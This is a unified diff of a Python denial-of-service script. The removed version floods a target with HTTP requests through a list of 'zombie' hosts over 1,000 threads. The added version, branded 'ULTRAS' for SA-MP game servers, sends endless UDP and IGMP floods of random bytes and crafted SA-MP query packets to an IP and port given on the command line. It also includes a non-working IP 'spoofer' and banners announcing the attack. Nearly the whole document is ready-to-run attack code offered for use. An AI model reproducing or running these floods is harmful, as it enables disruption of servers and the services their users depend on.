@@ -1,114 +1,262 @@
+#Since : 25-07-2022
+#-------[ ALL IMPORT ]-------#
 import socket
-import random
+import struct
+import codecs
+import sys
 import threading
-import socks
+import random
 import time
-import requests
+import os
+#-------[ ALL SETTINGS ]-------#
+ip = sys.argv[1]
+port = sys.argv[2]
 
-credit = """
-\033[1;36m
- ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
-▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
-▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
-░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
- ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
- ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓
-  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
-  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
-      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░
-                                         ░                  ░        ░         ░ ░                       ░          
-╔════════════════════════╗
-║ Created by: CazzySoci  ║
-║                        ║
-║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
-║                        ║
-║  We Are AnonCazzySoci  ║
-║    •We don't die       ║
-║    •We Multiply        ║
-║    •Expect us!         ║
-╚════════════════════════╝
-\033[1;36m
+#ip = str(input("IP TARGET:"))
+#port = int(input("PORT TARGET:"))
+
+fake_ip = '66.118.234.34:22'
+
+proxysy = open('socks5.txt').readlines()
+bots = len(proxysy)
+user = ('ADMIN')
+#---------------------[ Randomlex CODE ]---------------------#
+Randomlex = [
+ b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
+ b'SAMP\x958\xe1\xa9a\x1ec',
+ b'SAMP\x958\xe1\xa9a\x1ei',
+ b'SAMP\x958\xe1\xa9a\x1er',
+ b'SAMP\x958\xe1\xa9a\x1ev',
+ b'SAMP\x958\xe1\xa9a\x1eg',
+ b'\x08\x1eb\xda',
+ b'\x08\x1eb\xda',
+ b'\x02\x1e\xfdS',
+ b'\x08\x1eM\xda',
+ b'\x02\x1e\xfd@',
+ b'\x08\x1e~\xda'
+ ]
+prot = (random.randint(200,350))
+sys.stdout.write("\x1b]2;[-] ULTRAS | Online User : [{}] | Running Attack [1] | Bot Connected [{}] | Username : {}\x07".format (prot,bots,user))
+
+os.system("clear")
+#---------------------[ BANNER'S ]---------------------
+banner =  """
+\033[36m                        ╔════════════════════════════════════╗
+\033[36m                        ║       \033[33m╦ ╦ ╦  ═╦═ ╦═╗ ╔═╗ ╔═╗       \033[36m║
+\033[36m                        ║       \033[33m║ ║ ║   ║  ╠╦╝ ╠╩╣ ╚═╗       \033[36m║
+\033[36m                        ║       \033[33m╚═╝ ╩═╝ ╩  ╩╚═ ╩ ╩ ╚═╝       \033[36m║
+\033[36m                        ╚════════════════════════════════════╝
+\033[35m                   ╔═══════════════════════════════════════════╗                 
+\033[35m                   ║ \033[32m- -ATTACKING SERVER  (\033[33mAWAS DOWN BWANG\033[32m)- - \033[35m║
+\033[35m                   ╚═══════════════════════════════════════════╝
+"""
+banners = """
+\033[36m                      ╔════════════════════════════════════╗
+\033[36m                      ║\033[33m         ╦  ╔═╗═╗ ╦╔═╗╦ ╦╦ ╦\033[36m        ║
+\033[36m                      ║\033[33m         ║  ║╣ ╔╩╦╝║ ║╚╦╝╚╦╝\033[36m        ║
+\033[36m                      ║\033[33m         ╩═╝╚═╝╩ ╚═╚═╝ ╩  ╩ \033[36m        ║
+\033[36m                      ╚════════════════════════════════════╝
+\033[35m                    ╔═════════════════════════════════════════════╗                 
+\033[35m                    ║  \033[32m- -DEVELOPER TOOLS ULTRAS  (\033[33mLEX SA-MP\033[33m)- -\033[35m  ║
+\033[35m                    ╚═════════════════════════════════════════════╝
+"""
+welcome =  """
+───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to ULTRASS
+───█▒▒░░░░░░░░░▒▒█───   Use "help" For Help Command
+────█░░█░░░░░█░░█────   Developer Tools : Lexyy / LEX SA-MP
+─▄▄──█░░░▀█▀░░░█──▄▄─   
+█░░█─▀▄░░░░░░░▄▀─█░░█
+█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
+█░░║║║╠─║─║─║║║║║╠─░░█
+█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 """
 
+print(welcome)
+time.sleep(3)
+os.system("clear")
+print(banner)
+time.sleep(0.9)
+print ("\033[36m[BOT] \033[32m• \033[33mYOU ATTACK HAS LAUNCHED TO IP \033[31m%s \033[32mAND PORT \033[31m%s"%(ip,port))
 
-print(credit)
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '4.240.112.191'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
 
-target_ip = input("Enter the target IP address: ")
-target_port = int(input("Enter the target port: "))
-# Read the list of zombies IPs from the txt file
-zombies_list = []
-with open("zombies.txt", "r") as file:
-    for line in file:
-        zombie_ip = line.strip()
-        zombies_list.append(zombie_ip)
-
-# Read the list of user agents from a txt file
-user_agents = []
-with open("ua.txt", "r") as file:
-    for line in file:
-        user_agents.append(line.strip())
-
-# Number of threads for parallel attacks
-num_threads = 1000
-
-# Number of packets to send in each connection
-num_packets = 1000
-
-# Maximum payload size
-payload_size = 65535
-
-# Initialize a variable to keep track of the attack status
-attack_status = False
-
-# DDoS attack function
-def ddos_attack():
-    global attack_status
+#--------------[ START DDOS BY LEXYY ]--------------#
+def xxxxxxx():
     while True:
-        try:
-            # Select a random zombie IP from the list
-            zombie_ip = random.choice(zombies_list)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(999) #666
+        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'#ATTACK HEX
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(payload, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-            # Randomly select a user agent from the list
-            user_agent = random.choice(user_agents)
+def xxxxxx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+        bytes = random._urandom(1460)
+        payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(payload, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-            # Connect to the zombie
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((zombie_ip, target_port))
+def xxxxx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(999) #666
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-            # Generate payload bytes with maximum size
-            payload_bytes = b"A" * payload_size
+def xxxx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+        bytes = random._urandom(1460)
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-            # Construct the HTTP request with the selected user agent and payload bytes
-            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
-            request += payload_bytes.decode()
+def xxx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(666) #666
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
+                
+def xx():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+        bytes = random._urandom(1460)
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
 
-            # Send the attack request
-            for _ in range(num_packets):
-                s.sendall(request.encode())
+def x():
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1081) #1081
+        pack = random._urandom(999) #666
+        msg = Randomlex[random.randrange(0, 9)]
+        sock.sendto(bytes, (ip, int(port)))
+        sock.sendto(pack, (ip, int(port)))
+        sock.sendto(msg, (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[0], (ip, int(port)))
+        sock.sendto(Randomlex[1], (ip, int(port)))
+        sock.sendto(Randomlex[2], (ip, int(port)))
+        sock.sendto(Randomlex[3], (ip, int(port)))
+        sock.sendto(Randomlex[4], (ip, int(port)))
+        sock.sendto(Randomlex[5], (ip, int(port)))
+        sock.sendto(Randomlex[6], (ip, int(port)))
+        sock.sendto(Randomlex[7], (ip, int(port)))
+        sock.sendto(Randomlex[8], (ip, int(port)))
+        sock.sendto(Randomlex[9], (ip, int(port)))
+        sock.sendto(Randomlex[10], (ip, int(port)))
+        sock.sendto(Randomlex[11], (ip, int(port)))
+        
+              
+              
+#---------------------[ AUTO RUN ]---------------------#
+if __name__ == '__main__':
+    try:
+      xxxxxxx()
+      xxxxxx()
+      xxxxx()
+      xxxx()
+      xxx()
+      xx()
+      x()
 
-            # Close the connection with the zombie
-            s.close()
-
-            # Set the attack status to True once the attack starts
-            attack_status = True
-
-        except Exception as e:
-            # Handle any errors or connection issues
-            print("Error: {}".format(str(e)))
-
-# Start the DDoS attack threads
-for _ in range(num_threads):
-    t = threading.Thread(target=ddos_attack)
-    t.start()
-
-print("DDoS attack initiated!")
-
-# Monitor the attack status
-while True:
-    if attack_status:
-        print("Attack in progress...")
-    else:
-        print("No active attacks.")
-
-    # Rotate proxies every 10 seconds
-    time.sleep(10)
+#---------------------[ CLOSING ]---------------------#
+    except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print("\033[0;37;40mclosed")
